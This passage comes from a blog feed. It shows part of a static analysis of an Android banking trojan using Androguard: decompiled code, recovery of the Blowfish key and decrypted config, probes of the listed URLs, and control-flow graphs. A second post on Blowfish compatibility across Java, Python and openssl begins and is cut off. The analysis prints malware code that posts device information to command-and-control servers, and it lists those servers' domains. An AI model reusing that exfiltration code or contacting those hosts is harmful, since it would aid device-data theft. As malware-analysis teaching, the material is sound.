                    String[] v10 = new String[3];
                    v10[0] = com.gmail.xlibs.Blowfish.base64_encode(com.gmail.xlibs.myFunctions.deviceInfo(p14));
                    v10[1] = com.gmail.xlibs.myFunctions.IntToStr(com.gmail.xlibs.myFunctions.getVar(&quot;RID&quot;, 0, p14));
                    v10[2] = &quot;true&quot;;
                    try {
                        String v8 = com.gmail.xlibs.SimpleCurl.httpPost(v9, com.gmail.xlibs.SimpleCurl.prepareVars(v7, v10, &quot;UTF-8&quot;), &quot;UTF-8&quot;);
                    } catch (java.io.IOException v4) {
                        com.gmail.xlibs.myFunctions.setVar(&quot;RID&quot;, 0, p14);
                        v4.printStackTrace();
                    } catch (java.io.IOException v4) {
                        com.gmail.xlibs.myFunctions.setVar(&quot;RID&quot;, 0, p14);
                        v4.printStackTrace();
                    }
                    v8 = v8.trim();
                    if ((v8 != null) &amp;&amp; (v8.length() != 0)) {
                        com.gmail.xlibs.myFunctions.setVar(&quot;BLFSK&quot;, v8, p14);
                    } else {
                        com.gmail.xlibs.myFunctions.setVar(&quot;RID&quot;, 0, p14);
                        android.util.Log.d(&quot;HTTP&quot;, &quot;Obnilim rid&quot;);
                    }
                }
            }
        }
        return;
    }
</code></pre>
<p>Especially this line is very interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">com.<span style="color:#bbb">gmail</span>.<span style="color:#bbb">xlibs</span>.<span style="color:#bbb">myFunctions</span>.<span style="color:#bbb">parseXml</span>(<span style="color:#6ab825;font-weight:bold">new</span> com.<span style="color:#bbb">gmail</span>.<span style="color:#bbb">xlibs</span>.<span style="color:#bbb">Blowfish</span>(v5, <span style="color:#ed9d13">&#34;base64&#34;</span>, <span style="color:#ed9d13">&#34;12345678&#34;</span>).<span style="color:#bbb">decrypt</span>(com.<span style="color:#bbb">gmail</span>.<span style="color:#bbb">xlibs</span>.<span style="color:#bbb">myFunctions</span>.<span style="color:#bbb">getRawData</span>(1.<span style="color:#bbb">754581157260185e</span>+38, 1, p14)), p14);
</code></pre></div><p>Obviously the encrypted file has some XML content which has to be parsed first. The <em>parseXML</em> function requires a String parameter containing the XML code. The XML code has to be first decrypted:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#6ab825;font-weight:bold">new</span> com.<span style="color:#bbb">gmail</span>.<span style="color:#bbb">xlibs</span>.<span style="color:#bbb">Blowfish</span>(v5, <span style="color:#ed9d13">&#34;base64&#34;</span>, <span style="color:#ed9d13">&#34;12345678&#34;</span>)
</code></pre></div><p>This will create a new <code>Blowfish</code> object where the parameters are set as shown below:</p>
<ul>
<li><code>v5</code>
<ul>
<li>String v5 = com.gmail.xlibs.myFunctions.getRawData(1.754580954436089e+38, 0, p14);</li>
</ul>
</li>
<li><code>base64</code>
<ul>
<li>Format of ciphertext to be decrypted</li>
</ul>
</li>
<li><code>12345678</code>
<ul>
<li>The IV used for the Blowfish cipher</li>
</ul>
</li>
</ul>
<p><code>v5</code> contains the encryption key. This is have to be loaded first using <code>getRawData</code>. Let&rsquo;s have a look at it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_getRawData.source()
</code></pre></div><pre><code>    public static String getRawData(int p9, int p10, android.content.Context p11)
    {
        java.io.InputStream v4 = p11.getResources().openRawResource(p9);
        java.io.ByteArrayOutputStream v0 = new java.io.ByteArrayOutputStream();
        try {
            int v3 = v4.read();
        } catch (java.io.IOException v2) {
            v2.printStackTrace();
            String v6;
            String v5 = v0.toString();
            if (p10 != 0) {
                v6 = v5;
            } else {
                v6 = com.gmail.xlibs.Blowfish.byte2hex(v5.getBytes()).substring(0, 50);
            }
            return v6;
        }
        while (v3 != -1) {
            v0.write(v3);
            v3 = v4.read();
        }
        v4.close();
    }
</code></pre>
<p>The first argument <code>p9</code> is a shared preference and contains the name of the file the content should be read from. Using another decompiler l I had a look at the <code>getFirst</code> method and found this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">...
String str1 = getRawData(2130968576, 0, paramContext);
String str2 = getRawData(2130968577, 1, paramContext);
parseXml(<span style="color:#6ab825;font-weight:bold">new</span> Blowfish(str1, <span style="color:#ed9d13">&#34;base64&#34;</span>, <span style="color:#ed9d13">&#34;12345678&#34;</span>).<span style="color:#bbb">decrypt</span>(str2), paramContext);
...
</code></pre></div><p>Now what are those numbers: 2130968576 and 2130968577? Those are ressource identifier. If we hex them we&rsquo;ll have:</p>
<pre><code>hex(2130968576) = 7f040000 and 
hex(2130968577) = 7f040001
</code></pre>
<p>Let&rsquo;s search the files for this pattern:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
grep -r <span style="color:#ed9d13">&#34;7f040000&#34;</span> output/* &amp;&amp; grep -r <span style="color:#ed9d13">&#34;7f040001&#34;</span> output/*
</code></pre></div><pre><code>output/res/values/public.xml:    &lt;public type=&quot;raw&quot; name=&quot;blfs&quot; id=&quot;0x7f040000&quot; /&gt;
output/smali/com/gmail/xpack/R$raw.smali:.field public static final blfs:I = 0x7f040000
output/res/values/public.xml:    &lt;public type=&quot;raw&quot; name=&quot;config&quot; id=&quot;0x7f040001&quot; /&gt;
output/smali/com/gmail/xlibs/myFunctions.smali:    const v11, 0x7f040001
output/smali/com/gmail/xpack/R$raw.smali:.field public static final config:I = 0x7f040001
</code></pre>
<p>So those numbers are indeed ressources. What kind of?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
grep <span style="color:#ed9d13">&#34;7f04000&#34;</span> output/smali/com/gmail/xpack/R<span style="color:#ed9d13">\$</span>raw.smali
</code></pre></div><pre><code>.field public static final blfs:I = 0x7f040000
.field public static final config:I = 0x7f040001
</code></pre>
<p><strong>Bingo</strong>! Now we know that:</p>
<pre><code>2130968576 -&gt; 7f040000 -&gt; blfs.key
2130968577 -&gt; 7f040000 -&gt; blfs.cfg
</code></pre>
<p>So let&rsquo;s summarize some things:</p>
<ul>
<li><strong>getFirst()</strong> calls <strong>getRawData</strong> twice
<ol>
<li><code>getRawData(&quot;blfs.key&quot;, 0, paramContext);</code></li>
<li><code>getRawData(&quot;config.cg&quot;, 1, paramContext);</code></li>
</ol>
</li>
</ul>
<p>In getRawData() there is no magic happing: Some file stream is created and then the conten is read. <strong>BUT</strong>: There is one catch about it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#6ab825;font-weight:bold">if</span> (p10 != 0) {
     v6 = v5;
} <span style="color:#6ab825;font-weight:bold">else</span> {
    v6 = com.<span style="color:#bbb">gmail</span>.<span style="color:#bbb">xlibs</span>.<span style="color:#bbb">Blowfish</span>.<span style="color:#bbb">byte2hex</span>(v5.<span style="color:#bbb">getBytes</span>()).<span style="color:#bbb">substring</span>(0, 50);
}
</code></pre></div><p><code>p10</code> is the 2nd argument given to getRawData. If you pay attention you may notice that if <code>p10</code> == 1 nothing special will happen. Otherwise (content of blfs.key is read out) there are some string manipulations taking place. This took me a while to notice it and was the reason I couldn&rsquo;t decrypt the config.cfg. This is what it does with the content of <code>blfs.key</code>:</p>
<ul>
<li>convert string to byte array</li>
<li>convert byte array to hex string</li>
<li>take only the first 50 bytes</li>
</ul>
<p>In the end <code>v6</code> will contain the decryption key. Using <a href="https://www.dlitz.net/software/pycrypto/">PyCrypto</a> we&rsquo;ll try to decrypt the content in Python:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from Crypto.Cipher import Blowfish
from Crypto import Random
from struct import pack
from binascii import hexlify, unhexlify

# Read content from files
blfs_key = !cat output/res/raw/blfs.key
ciphertext_base64 = !cat output/res/raw/config.cfg
ciphertext_raw = ciphertext_base64[0].decode(&#34;base64&#34;)

# Some settings
IV = &#34;12345678&#34;
_KEY = blfs_key[0]
ciphertext = ciphertext_raw

# As seen in the source code: 
#  * hex-encode the blfs key
#  * take only the substring[0:50]
KEY = hexlify(_KEY)[:50]

# Do the decryption
cipher = Blowfish.new(KEY, Blowfish.MODE_CBC, IV)
message = cipher.decrypt(ciphertext)

message
</code></pre></div><pre><code>'&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n          &lt;config&gt;\n            &lt;data rid=&quot;25&quot; \n                  shnum10=&quot;&quot; shtext10=&quot;&quot; shnum5=&quot;&quot; shtext5=&quot;&quot; shnum3=&quot;&quot; shtext3=&quot;&quot; shnum1=&quot;&quot; shtext1=&quot;&quot; \n                  del_dev=&quot;0&quot; \n                  url_main=&quot;http://best-invest-int.com/gallery/3.php;http://citroen-club.ch/images/3.php&quot; \n                  url_data=&quot;http://best-invest-int.com/gallery/1.php;http://citroen-club.ch/images/1.php&quot; \n                  url_sms=&quot;http://best-invest-int.com/gallery/2.php;http://citroen-club.ch/images/2.php&quot;\n                  url_log=&quot;http://best-invest-int.com/gallery/4.php;http://citroen-club.ch/images/4.php&quot;\n                  download_domain=&quot;certificates-security.com&quot;\n                  ready_to_bind=&quot;0&quot; /&gt;\n            \n          &lt;/config&gt;\x05\x05\x05\x05\x05'
</code></pre>
<p>Yeay! Now a more structured look at the XML:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from lxml import etree
import xml.etree.ElementTree as ET

# Remove dirty characters
xml = message.replace(&#34;\x05&#34;, &#34;&#34;).replace(&#34;\n&#34;, &#34;&#34;)

# Create XML tree from string
root = etree.XML(xml)
data = root.xpath(&#34;/config//data&#34;)

frame = []
# Get data
for sample in data:
    for attr_name, attr_value in sample.items():
        values = attr_value.split(&#34;;&#34;)
        for v in values:
            frame.append((attr_name, v))

# Show attributes found in /config/data
df = pd.DataFrame(frame, columns=[&#39;Attribute&#39;, &#39;Value&#39;])
df
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Attribute</th>
      <th>Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td>             rid</td>
      <td>                                       25</td>
    </tr>
    <tr>
      <th>1 </th>
      <td>         shnum10</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>2 </th>
      <td>        shtext10</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>3 </th>
      <td>          shnum5</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>4 </th>
      <td>         shtext5</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>5 </th>
      <td>          shnum3</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>6 </th>
      <td>         shtext3</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>7 </th>
      <td>          shnum1</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>8 </th>
      <td>         shtext1</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>9 </th>
      <td>         del_dev</td>
      <td>                                        0</td>
    </tr>
    <tr>
      <th>10</th>
      <td>        url_main</td>
      <td> http://best-invest-int.com/gallery/3.php</td>
    </tr>
    <tr>
      <th>11</th>
      <td>        url_main</td>
      <td>      http://citroen-club.ch/images/3.php</td>
    </tr>
    <tr>
      <th>12</th>
      <td>        url_data</td>
      <td> http://best-invest-int.com/gallery/1.php</td>
    </tr>
    <tr>
      <th>13</th>
      <td>        url_data</td>
      <td>      http://citroen-club.ch/images/1.php</td>
    </tr>
    <tr>
      <th>14</th>
      <td>         url_sms</td>
      <td> http://best-invest-int.com/gallery/2.php</td>
    </tr>
    <tr>
      <th>15</th>
      <td>         url_sms</td>
      <td>      http://citroen-club.ch/images/2.php</td>
    </tr>
    <tr>
      <th>16</th>
      <td>         url_log</td>
      <td> http://best-invest-int.com/gallery/4.php</td>
    </tr>
    <tr>
      <th>17</th>
      <td>         url_log</td>
      <td>      http://citroen-club.ch/images/4.php</td>
    </tr>
    <tr>
      <th>18</th>
      <td> download_domain</td>
      <td>                certificates-security.com</td>
    </tr>
    <tr>
      <th>19</th>
      <td>   ready_to_bind</td>
      <td>                                        0</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="inspect-malwares-config">Inspect malwares config</h2>
<p>Looks interesting. Are those URLs still available?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import urllib2
 
# Get URLs from DataFrame (only the valid ones)
urls = df[&#39;Value&#39;][10:19].tolist()
#urls = [&#34;http://google.de/&#34;, &#34;http://blog.dornea.nu/about&#34;]
resp = {}

def get_status_code(host, path=&#34;/&#34;):
    &#34;&#34;&#34; This function retreives the status code of a website by requesting
        HEAD data from the host. This means that it only requests the headers.
        If the host cannot be reached or something else goes wrong, it returns
        None instead.
    &#34;&#34;&#34;
    try:
        conn = httplib.HTTPConnection(host)
        conn.request(&#34;HEAD&#34;, path)
        return conn.getresponse().getheaders()
    except StandardError:
        return None

# Iterate through URLs
for u in urls:
    p = &#39;(?:http.*://)?(?P&lt;host&gt;[^:/ ]+).?(?P&lt;port&gt;[0-9]*)/(?P&lt;path&gt;.*)&#39;
    m = re.search(p, u)
    if m:
        status_code = get_status_code(m.group(&#39;host&#39;), &#34;/&#34; + m.group(&#39;path&#39;))
        resp[u] = status_code
resp
</code></pre></div><pre><code>{'http://best-invest-int.com/gallery/1.php': None,
 'http://best-invest-int.com/gallery/2.php': None,
 'http://best-invest-int.com/gallery/3.php': None,
 'http://best-invest-int.com/gallery/4.php': None,
 'http://citroen-club.ch/images/1.php': [('date',
   'Fri, 04 Jul 2014 08:31:12 GMT'),
  ('content-type', 'text/html; charset=iso-8859-1'),
  ('server', 'Apache')],
 'http://citroen-club.ch/images/2.php': [('date',
   'Fri, 04 Jul 2014 08:31:12 GMT'),
  ('content-type', 'text/html; charset=iso-8859-1'),
  ('server', 'Apache')],
 'http://citroen-club.ch/images/3.php': [('date',
   'Fri, 04 Jul 2014 08:31:11 GMT'),
  ('content-type', 'text/html; charset=iso-8859-1'),
  ('server', 'Apache')],
 'http://citroen-club.ch/images/4.php': [('date',
   'Fri, 04 Jul 2014 08:31:12 GMT'),
  ('content-type', 'text/html; charset=iso-8859-1'),
  ('server', 'Apache')]}
</code></pre>
<p>Hmmm.. Nothing special. The servers might have been patched meanwhile against this malware. I hope we&rsquo;re going to see more when doing the dynamic analysis.</p>
<h2 id="control-flow-graph-cfg">Control Flow Graph (CFG)</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
mkdir DEX
cp 7276e76298c50d2ee78271cf5114a176 DEX
<span style="color:#24909d">cd</span> DEX
unzip 7276e76298c50d2ee78271cf5114a176
<span style="color:#24909d">cd</span> ..
</code></pre></div><pre><code>Archive:  7276e76298c50d2ee78271cf5114a176
signed by SignApk
  inflating: META-INF/MANIFEST.MF    
  inflating: META-INF/CERT.SF        
  inflating: META-INF/CERT.RSA       
  inflating: AndroidManifest.xml     
  inflating: classes.dex             
 extracting: res/drawable-hdpi/ic_launcher1.png  
 extracting: res/drawable-hdpi/logo.png  
 extracting: res/drawable-ldpi/ic_launcher1.png  
 extracting: res/drawable-mdpi/ic_launcher1.png  
 extracting: res/drawable-xhdpi/ic_launcher1.png  
  inflating: res/layout/actup.xml    
  inflating: res/layout/main.xml     
  inflating: res/layout/main2.xml    
  inflating: res/menu/main.xml       
 extracting: res/raw/blfs.key        
  inflating: res/raw/config.cfg      
  inflating: resources.arsc          
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import hashlib
import StringIO, pydot
from IPython.display import Image
from androguard.core.bytecodes.dvm import *
from androguard.core.analysis.analysis import VMAnalysis
from androguard.core.bytecode import method2dot, method2format, method2png


d = DalvikVMFormat(open(&#34;DEX/classes.dex&#34;).read())
x = VMAnalysis(d)
d.set_vmanalysis(x)


# Utilities
def create_graph(data, output):
    # Stolen from androguard/core/bytecode.py
    buff = &#34;digraph {\n&#34;
    buff += &#34;graph [rankdir=TB]\n&#34;
    buff += &#34;node [shape=plaintext]\n&#34;
    
    # subgraphs cluster
    buff += &#34;subgraph cluster_&#34; + hashlib.md5(output).hexdigest() + &#34; {\nlabel=\&#34;%s\&#34;\n&#34; % data[&#39;name&#39;]
    buff += data[&#39;nodes&#39;]
    buff += &#34;}\n&#34;

    # subgraphs edges
    buff += data[&#39;edges&#39;]
    buff += &#34;}\n&#34;
    
    graph = pydot.graph_from_dot_data(buff)
    
    return graph
</code></pre></div><h3 id="comgmailxlibsmyfunctions-getfirst">com.gmail.xlibs.myFunctions: getFirst()</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Definition:  d.get_method_descriptor(self, class_name, method_name, descriptor)
# 
# Examples for method descriptors:
#   R 62 Lcom/gmail/xlibs/myFunctions;-&gt;getFirst (Landroid/content/Context;)V
#   R 17c Lcom/gmail/xlibs/myFunctions;-&gt;getFirst (Landroid/content/Context;)V
#   R e8 Lcom/gmail/xlibs/myFunctions;-&gt;getSecond (Landroid/content/Context;)V
#   R 0 Lcom/gmail/xlibs/myFunctions;-&gt;setK12 (Ljava/lang/String; Landroid/content/Context;)Ljava/lang/String;

m = d.get_method_descriptor(&#34;Lcom/gmail/xlibs/myFunctions;&#34;, &#34;getFirst&#34;, &#34;(Landroid/content/Context;)V&#34;)
buff_dot = method2dot(x.get_method(m))

graph = create_graph(buff_dot, &#34;png&#34;)
Image(graph.create_png())
</code></pre></div><p><img src="/posts/img/2014/disect-android-apks-like-a-pro-sca/output_79_0.png" alt="png"></p>
<h3 id="comgmailxlibsmyfunctions-getsecond">com.gmail.xlibs.myFunctions: getSecond()</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">m = d.get_method_descriptor(&#34;Lcom/gmail/xlibs/myFunctions;&#34;, &#34;getSecond&#34;, &#34;(Landroid/content/Context;)V&#34;)
buff_dot = method2dot(x.get_method(m))

graph = create_graph(buff_dot, &#34;png&#34;)
Image(graph.create_png())
</code></pre></div><p><img src="/posts/img/2014/disect-android-apks-like-a-pro-sca/output_81_0.png" alt="png"></p>
<h3 id="comgmailxservices-xrepeat">com.gmail.xservices: XRepeat</h3>
<p><code>getFirst</code> and <code>getSecond</code> are both called from the class <code>com.gmail.xservices.XRepeat</code> in the method <code>doInBackground</code>. Let&rsquo;s search for the appropriate <em>method descriptor</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># We should have a list of PathP objects which represent where a specific method is called:
paths = x.tainted_packages.search_methods(&#34;.&#34;, &#34;onReceive&#34;, &#34;.&#34;)
paths
</code></pre></div><pre><code>[&lt;androguard.core.analysis.analysis.PathP instance at 0x101a5290&gt;]
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Get the class manager from the VM
cm = d.get_class_manager()

src = []
dst = []
# Iterate through paths
for p in paths:
    src.append(p.get_src(cm))
    dst.append(p.get_dst(cm))

df_src = pd.DataFrame(src, columns=[&#39;From&#39;, &#39;Method&#39;, &#39;Type&#39;])
df_dst = pd.DataFrame(dst, columns=[&#39;To&#39;, &#39;Method&#39;, &#39;Type&#39;])
display_html(df_src)
display_html(df_dst)
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>From</th>
      <th>Method</th>
      <th>Type</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> Landroid/support/v4/content/LocalBroadcastMana...</td>
      <td> executePendingBroadcasts</td>
      <td> ()V</td>
    </tr>
  </tbody>
</table>
</div>
<div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>To</th>
      <th>Method</th>
      <th>Type</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> Landroid/content/BroadcastReceiver;</td>
      <td> onReceive</td>
      <td> (Landroid/content/Context; Landroid/content/In...</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">m = d.get_method_descriptor(&#34;Lcom/gmail/xservices/XRepeat;&#34;, &#34;onReceive&#34;, &#34;(Landroid/content/Context; Landroid/content/Intent;)V&#34;)

buff_dot = method2dot(x.get_method(m))
graph = create_graph(buff_dot, &#34;png&#34;)
Image(graph.create_png())
</code></pre></div><p><img src="/posts/img/2014/disect-android-apks-like-a-pro-sca/output_86_0.png" alt="png"></p>
<h2 id="conclusion">Conclusion</h2>
<p>I&rsquo;ve found cool new ways how to analyze an APK using python tools. <strong>AndroGuard</strong> seems to be a quite good framework to work it. Although I&rsquo;ve managed it to get <em>almost</em> everything working, I must say that the project itself (and its components!) aren&rsquo;t well documented. Then I had several errors like this one:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># ~/work/bin/androguard/androdd.py -i FakeBanker.apk -f PNG -o neu</span>
Dump information FakeBanker.apk in neu
Clean directory neu
Analysis ... End
Decompilation ... End
ERROR: module pydot not found
Dump Landroid/support/v4/app/FragmentManager; &lt;init&gt; ()V ... PNG ...
Traceback (most recent call last):
  File <span style="color:#ed9d13">&#34;/root/work/bin/androguard/androdd.py&#34;</span>, line 222, in &lt;module&gt;
    main(options, arguments)
  File <span style="color:#ed9d13">&#34;/root/work/bin/androguard/androdd.py&#34;</span>, line 207, in main~~~~
    export_apps_to_format(options.input, a, options.output, options.limit, options.jar, options.decompiler, options.format)
  File <span style="color:#ed9d13">&#34;/root/work/bin/androguard/androdd.py&#34;</span>, line 180, in export_apps_to_format
    method2format(filename + <span style="color:#ed9d13">&#34;.&#34;</span> + format, format, None, buff)
  File <span style="color:#ed9d13">&#34;/root/work/bin/androguard/androguard/core/bytecode.py&#34;</span>, line 338, in method2format
    error(<span style="color:#ed9d13">&#34;module pydot not found&#34;</span>)
  File <span style="color:#ed9d13">&#34;/root/work/bin/androguard/androguard/core/androconf.py&#34;</span>, line 270, in error
    raise()
TypeError: exceptions must be old-style classes or derived from BaseException, not tuple
</code></pre></div><p>But I don&rsquo;t want to complain about the project. In fact I think its the most comprehensive tool bundle out there for analytical purposes. If you know better alternatives just let me know about it. In the <strong>next part</strong> I&rsquo;ll be writing about <strong>dynamic code analysis</strong>. So stay tuned :)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>On Java, OpenSSL, Crypto, Blowfish and stuff</title>
      <link>https://blog.dornea.nu/2014/07/01/on-java-openssl-crypto-blowfish-and-stuff/</link>
      <pubDate>Tue, 01 Jul 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/07/01/on-java-openssl-crypto-blowfish-and-stuff/</guid>
      <content:encoded><![CDATA[<p>During some Android malware analysis I came along some Java routines which were meant to decrypt/encrypt some content. Nothing special about it. The key had to be extracted from a file and the encrypted file was in Base64. After unsuccessfully trying <strong>openssl</strong> in order to decrypt the file I decided to make some further investigations.</p>
<p>In this article I&rsquo;ll have a look how <code>Python</code>, <code>Java</code> and <code>openssl</code> (command line utility) implement <a href="https://www.schneier.com/paper-blowfish-fse.html">Blowfish</a> in <code>CBC</code> mode. Furthermore I want to know if data encrypted with Python can be later on decrypted with Java and viceversa. Following compatibility dependencies might be interesting:</p>
<ol>
<li>Python &lt;-&gt; Java</li>
<li>Java &lt;-&gt; openssl</li>
<li>Python &lt;-&gt; openssl</li>
</ol>
<h2 id="java">Java</h2>
<p>Let&rsquo;s take a look at some routines in <code>Java</code>. You can also view/download the following code on this <a href="https://gist.github.com/dorneanu/b8e53b034d89f6be383c">GitHub Gist</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#999;font-style:italic">/*
</span><span style="color:#999;font-style:italic"> * Based on https://raw.githubusercontent.com/usefulfor/usefulfor/master/security/JBoss.java
</span><span style="color:#999;font-style:italic"> *
</span><span style="color:#999;font-style:italic"> * JBoss.java - Blowfish encryption/decryption tool with JBoss default password
</span><span style="color:#999;font-style:italic"> *    Daniel Martin Gomez &lt;daniel@ngssoftware.com&gt; - 03/Sep/2009
</span><span style="color:#999;font-style:italic"> *
</span><span style="color:#999;font-style:italic"> * This file may be used under the terms of the GNU General Public License
</span><span style="color:#999;font-style:italic"> * version 2.0 as published by the Free Software Foundation:
</span><span style="color:#999;font-style:italic"> *   http://www.gnu.org/licenses/gpl-2.0.html
</span><span style="color:#999;font-style:italic"> */</span>
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">javax.crypto.*</span>;
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">javax.crypto.spec.SecretKeySpec</span>;

<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">java.math.BigInteger</span>;
<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">javax.xml.bind.DatatypeConverter</span>;

<span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">JBlowfish</span>
{
    <span style="color:#6ab825;font-weight:bold">final</span> <span style="color:#6ab825;font-weight:bold">protected</span> <span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">char</span>[] hexArray = <span style="color:#ed9d13">&#34;0123456789ABCDEF&#34;</span>.<span style="color:#bbb">toCharArray</span>();

    <span style="color:#999;font-style:italic">// Converts byte array to hex string
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#999;font-style:italic">// From: http://stackoverflow.com/questions/9655181/convert-from-byte-array-to-hex-string-in-java
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">static</span> String <span style="color:#447fcf">bytesToHex</span>(<span style="color:#6ab825;font-weight:bold">byte</span>[] bytes) {
        <span style="color:#6ab825;font-weight:bold">char</span>[] hexChars = <span style="color:#6ab825;font-weight:bold">new</span> <span style="color:#6ab825;font-weight:bold">char</span>[bytes.<span style="color:#bbb">length</span> * 2];
        <span style="color:#6ab825;font-weight:bold">for</span> ( <span style="color:#6ab825;font-weight:bold">int</span> j = 0; j &lt; bytes.<span style="color:#bbb">length</span>; j++ ) {
            <span style="color:#6ab825;font-weight:bold">int</span> v = bytes[j] &amp; 0xFF;
            hexChars[j * 2] = hexArray[v &gt;&gt;&gt; 4];
            hexChars[j * 2 + 1] = hexArray[v &amp; 0x0F];
        }
        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">new</span> String(hexChars);
    }

    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>(String[] args) <span style="color:#6ab825;font-weight:bold">throws</span> Exception
    {

        <span style="color:#6ab825;font-weight:bold">if</span> ( ( args.<span style="color:#bbb">length</span> != 2 ) || !( args[0].<span style="color:#bbb">equals</span>(<span style="color:#ed9d13">&#34;-e&#34;</span>) | args[0].<span style="color:#bbb">equals</span>(<span style="color:#ed9d13">&#34;-d&#34;</span>) ) )
        {
            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>( <span style="color:#ed9d13">&#34;Usage:\n\tjava JBlowfish &lt;-e|-d&gt; &lt;encrypted_password&gt;&#34;</span> );
            <span style="color:#6ab825;font-weight:bold">return</span>;
        }

        String mode = args[0];

        <span style="color:#999;font-style:italic">// Configuration
</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">byte</span>[] key  = <span style="color:#ed9d13">&#34;secret&#34;</span>.<span style="color:#bbb">getBytes</span>();
        String IV   = <span style="color:#ed9d13">&#34;12345678&#34;</span>;


        System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;-- Settings -----------&#34;</span>);
